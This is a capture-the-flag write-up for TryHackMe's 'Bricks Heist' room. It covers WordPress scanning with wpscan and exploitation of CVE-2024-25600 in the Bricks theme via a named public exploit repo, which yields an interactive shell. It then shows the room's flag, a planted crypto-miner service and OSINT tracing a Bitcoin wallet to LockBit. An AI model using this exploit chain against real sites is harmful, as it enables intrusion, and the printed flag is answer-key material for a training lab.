# TryHack3M: Bricks Heist

## 🔗 [Bricks Heist on TryHackMe](https://tryhackme.com/room/tryhack3mbricksheist)

## Overview

* **Difficulty:** Easy
* **Category:** Web / WordPress / Exploitation / OSINT
* **Skills Practiced:** WordPress fingerprinting, theme vulnerability scanning, exploit setup & execution, post-exploitation enumeration, basic OSINT on cryptocurrency wallets

## Tools & Techniques

* `wpscan` – WordPress fingerprinting and surface discovery
* `gobuster` / robots.txt inspection – directory discovery (robots revealed /wp-admin)
* CVE exploit script (CVE-2024-25600) – Python exploit from public repo
* `python3 -m venv` & `pip` – build and run exploit in virtualenv
* `systemctl` / `ls` / `cat` – post-exploitation enumeration
* CyberChef / online blockchain explorer – decode and lookup Bitcoin address, OSINT on transactions

## Walkthrough (Step-by-Step)

### 1. Hosts setup

* Add host mapping to `/etc/hosts`.

	```bash
	sudo vim /etc/hosts
	```

	Paste the following
	```text
	Add to /etc/hosts:
	<thm-ip> bricks.thm
	```

### 2. Check robots.txt (discover admin paths)

* Visit `bricks.thm/robots.txt` or use curl/browser.

* `/wp-admin/` is listed.

	**Key Point:** robots.txt can reveal admin endpoints to target.

### 3. WordPress fingerprinting with WPScan

* Run `wpscan` (disable TLS checks if using hostname mapped to IP with self-signed cert).

	```bash
	wpscan --url https://bricks.thm
	# If SSL fails:
	wpscan --url https://bricks.thm --disable-tls-checks
	```

	**Findings (important excerpts):**

	```
	[+] URL: https://bricks.thm/ [<thm-ip>]
	[+] robots.txt found: ... /wp-admin/ ...
	[+] XML-RPC enabled: https://bricks.thm/xmlrpc.php
	[+] WordPress version 6.5 identified
	[+] WordPress theme in use: bricks
	Version: 1.9.5 (80% confidence)
	```

	**Key Point:** WPScan reveals WordPress version & theme — useful to search for theme-specific CVEs.

### 4. Locate theme vulnerability (CVE-2024-25600)

* Identify that the `bricks` theme likely has a public exploit (search by theme name + CVE).

	```text
	# (manual/OSINT) Search for: "bricks theme exploit CVE-2024-25600"
	# Found repo: https://github.com/K3ysTr0K3R/CVE-2024-25600-EXPLOIT
	```

* Public exploit code exists for the `bricks` theme vulnerability (CVE-2024-25600).

### 5. Prepare exploit environment (virtualenv + deps)

* Clone or copy exploit script, set up Python venv, install requirements before running.

	```bash
	python3 -m venv venv
	source venv/bin/activate
	pip install -r requirements.txt
	```

### 6. Run exploit (interactive shell)

* Execute exploit script against `https://bricks.thm`.

	```bash
	python3 exploit.py -u https://bricks.thm
	```

	**Output (session excerpt):**

	```
	[*] Checking if the target is vulnerable
	[+] The target is vulnerable
	[*] Initiating interactive shell
	[+] Interactive shell opened successfully
	Shell> ls
	650c844110baced87e1606453b93f22a.txt
	index.php
	kod
	license.txt
	phpmyadmin
	...
	Shell> cat 650c844110baced87e1606453b93f22a.txt
	THM{fl46_650c844110baced87e1606453b93f22a}
	```

	**Findings:**

	* Exploit succeeded and opened an interactive shell.
	* **Flag found:** `THM{fl46_650c844110baced87e1606453b93f22a}`.

### 7. Enumerate running services (post-exploitation)

* List active services to spot suspicious services or service units (in shell).

	```bash
	systemctl list-units --type=service --state=running
	```

	**Findings (excerpt):**

	```
	ubuntu.service                                 loaded active running TRYHACK3M
	```

### 8. Inspect suspicious systemd service

* View the unit file to see what the service runs (in shell).

	```bash
	systemctl cat ubuntu.service
	```

	**Output:**

	```
	# /etc/systemd/system/ubuntu.service
	[Unit]
	Description=TRYHACK3M

	[Service]
	Type=simple
	ExecStart=/lib/NetworkManager/nm-inet-dialog
	Restart=on-failure

	[Install]
	WantedBy=multi-user.target
	```

	**Findings:**

	* The service runs `/lib/NetworkManager/nm-inet-dialog`. Process name: `nm-inet-dialog`.

### 9. Inspect NetworkManager files

* List files in `/lib/NetworkManager/` and view relevant config (in shell).

	```bash
	ls /lib/NetworkManager/
	head /lib/NetworkManager/inet.conf
	```

	**Findings (excerpt from inet.conf):**

	```
	ID: 5757314e65474e59... (base64/hex blob)
	2024-04-08 10:46:04,743 [*] confbak: Ready!
	2024-04-08 10:46:04,743 [*] Status: Mining!
	2024-04-08 10:46:08,745 [*] Miner()
	...
	```

	**Key Point:** `inet.conf` contains an encoded blob and logs referencing "Mining" and "Bitcoin Miner". The blob likely contains encoded data (e.g., concatenated Bech32 addresses).

### 10. Decode embedded blob (CyberChef / base-decoder)

* Copy the encoded blob and decode with CyberChef or equivalent decoders until you get readable text (Bech32 strings start with `bc1`).

	**Findings:**

	* Decoded concatenation contains:

		```
		bc1qyk79fcp9hd5kreprce89tkh4wrtl8avt4l67qabc1qyk79fcp9had5kreprce89tkh4wrtl8avt4l67qa
		```

	* Which splits into two Bech32 addresses; valid one found:

	* `bc1qyk79fcp9hd5kreprce89tkh4wrtl8avt4l67qa`

	**Key Point:** Malware/miner configuration stored crypto-wallet addresses — good OSINT target.

### 11. Blockchain OSINT (lookup wallet activity)

* Use a blockchain explorer (e.g., blockchain.com explorer) to search wallet transactions.

	```text
	https://www.blockchain.com/explorer/address/bc1qyk79fcp9hd5kreprce89tkh4wrtl8avt4l67qa
	```

* Wallet shows large transactions. OSINT on the wallet leads to references linking to sanctions/OFAC material — one path leads to an entry naming an individual "Ivan Gennadievich" and links to LockBit ransomware group.

	**Key Point:** Crypto-address OSINT can connect infrastructure to threat actors (in this case, evidence points to LockBit).
